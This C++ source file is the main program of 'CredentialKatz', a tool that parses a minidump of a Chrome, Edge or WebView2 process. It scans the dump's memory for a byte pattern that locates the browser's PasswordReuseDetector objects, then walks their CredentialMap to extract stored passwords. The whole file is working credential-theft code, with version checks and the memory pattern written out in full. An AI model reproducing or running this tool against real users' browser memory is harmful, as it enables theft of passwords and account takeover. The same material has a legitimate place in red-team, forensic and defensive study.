#include "udmp-parser.h"

#define WIN32_LEAN_AND_MEAN 
#include <Windows.h>
#include <stdio.h>
#include "Helper.h"
#include "Memory.h"

void banner() { //This is important
	printf("  _____              _            _   _       _ _  __     _       \n");
	printf(" / ____|            | |          | | (_)     | | |/ /    | |      \n");
	printf("| |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | ' / __ _| |_ ____\n");
	printf("| |    | '__/ _ \\/ _` |/ _ \\ '_ \\| __| |/ _` | |  < / _` | __|_  /\n");
	printf("| |____| | |  __/ (_| |  __/ | | | |_| | (_| | | . \\ (_| | |_ / / \n");
	printf(" \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|_|\\_\\__,_|\\__/___|\n");
	printf("By Meckazin                                  github.com / Meckazin \n");
};

void usage() {
	wprintf(L"CredentialKatz Minidump parser\n");
	wprintf(L"Usage: \n");
	wprintf(L"    CredentialKatzMinidump.exe <Path_to_minidump_file>\n\n");
	wprintf(L"Example:\n");
	wprintf(L"    .\\CredentialKatzMinidump.exe .\\msedge.DMP\n\n");
	wprintf(L"You need to dump the Chrome/Edge main process.\n");
}

int main(int argc, char* argv[]) {

	banner();
	printf("Don't use your cat's name as a password!\n\n");

	if (argc <= 1) {
		usage();
		return EXIT_SUCCESS;
	}

	DWORD result = GetFileAttributesA(argv[1]);
	if (result == INVALID_FILE_ATTRIBUTES) {
		PrintErrorWithMessage(L"Could not find the dump file");
		return EXIT_FAILURE;
	}
	if (result != FILE_ATTRIBUTE_ARCHIVE) {
		wprintf(L"[-] File is not a minidump!\n");
		wprintf(L"    Attributes were: %d\n", result);
		return EXIT_FAILURE;
	}

	printf("[*] Trying to parse the file: %s\n", argv[1]);

	udmpparser::UserDumpParser dump;
	if (!dump.Parse(argv[1])) {
		printf("[-] Failed to parse file: %s\n", argv[1]);
		return EXIT_FAILURE;
	}

	LPCSTR targetDll = "\0";
	uintptr_t dllBaseaddr = 0;
	bool found = false;
	TargetVersion targetConfig = Chrome;
	udmpparser::dmp::FixedFileInfo_t fileInfo = { 0 };

	const auto& Modules = dump.GetModules();
	for (const auto& [Base, ModuleInfo] : Modules) {
		if (ModuleInfo.ModuleName.find("chrome.exe") != std::string::npos) {
			printf("[*] Using Chrome configuration\n\n");
			targetDll = "chrome.dll";
			fileInfo = ModuleInfo.VersionInfo;
			found = true;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedge.exe") != std::string::npos) {
			printf("[*] Using MSEdge configuration\n\n");
			targetDll = "msedge.dll";
			fileInfo = ModuleInfo.VersionInfo;
			targetConfig = Edge;
			found = true;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedgewebview2.exe") != std::string::npos) {
			printf("[*] Using MSEdgeWebView configuration\n\n");
			targetDll = "msedge.dll";
			fileInfo = ModuleInfo.VersionInfo;
			targetConfig = Webview2;
			found = true;
			break;
		}
	}

	if (!found) {
		printf("[-] The dump is from unsupported process\n");
		return EXIT_SUCCESS;
	}

	if (dump.GetArch() != udmpparser::ProcessorArch_t::AMD64) {
		printf("[-] Dump is not from x64 process!\n");
		return EXIT_SUCCESS;
	}

	printf("[*] Browser Version: %hu.%hu.%hu.%hu\n\n",
		HIWORD(fileInfo.ProductVersionMS),
		LOWORD(fileInfo.ProductVersionMS),
		HIWORD(fileInfo.ProductVersionLS),
		LOWORD(fileInfo.ProductVersionLS)
	);

	WORD highMajor = HIWORD(fileInfo.ProductVersionMS);
	WORD highMinor = HIWORD(fileInfo.ProductVersionLS);

	//Update config based on target version
	if (targetConfig == Chrome) {
		if ((highMajor == 122 && highMinor <= 6260) ||
			(highMajor < 122)) {
			PRINT("[-] This browser version is not supported!\n");
			return 0;
		}
	}
	else if (targetConfig == Edge || targetConfig == Webview2) {
		if ((highMajor == 122 && highMinor <= 6260) ||
			(highMajor < 122)) { //Honestly no idea, these haven't been tested
			PRINT("[-] This browser version is not supported!\n");
			return 0;
		}
	}

	//One pattern to rule them all
	size_t szPattern = 176;
	BYTE pattern[] = {
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};

	for (const auto& [Base, ModuleInfo] : Modules) {
		if (ModuleInfo.ModuleName.find(targetDll) != std::string::npos) {
			dllBaseaddr = ModuleInfo.BaseOfImage;
		}
	}

#ifdef _DEBUG
	PRINT("[+] Found %s in address: 0x%p\n", targetDll, (void*)dllBaseaddr);
#endif
	uintptr_t targetSection = 0;
	if (!FindLargestSection(dump, targetDll, targetSection)) {
		PRINT("[-] Something went wrong");
		return 0;
	}

#ifdef _DEBUG
	PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
#endif
	BYTE chromeDllPattern[sizeof(uintptr_t)];
	ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

	//Patch in the base address
	PatchPattern(pattern, chromeDllPattern, 8);

	uintptr_t* PasswordReuseDetectorInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100);
	size_t szPasswordReuseDetectorInstances = 0;
	if (PasswordReuseDetectorInstances == NULL || !FindPattern(dump, pattern, szPattern, PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances))
	{
		PRINT("[-] Failed to find pattern\n");
		free(PasswordReuseDetectorInstances);
		return 0;
	}

	PRINT("[*] Found %Iu instances of CredentialMap!\n", szPasswordReuseDetectorInstances);
#ifdef _DEBUG
	for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
		PRINTW(TEXT("[*] Found PasswordReuseDetector on 0x%p\n"), (void*)PasswordReuseDetectorInstances[i]);
#endif

	for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
	{
		if (PasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
			break;
		uintptr_t CredentialMapOffset = 0x18; //Offset to passwords_with_matching_reused_credentials_ 0x20 for my own debug build
		CredentialMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
		PRINTW(TEXT("[*] CredentialMap should be found in address 0x%p\n"), (void*)CredentialMapOffset);
#endif
		WalkCredentialMap(dump, CredentialMapOffset);
	}

	printf("[+] Done");

	return EXIT_SUCCESS;
}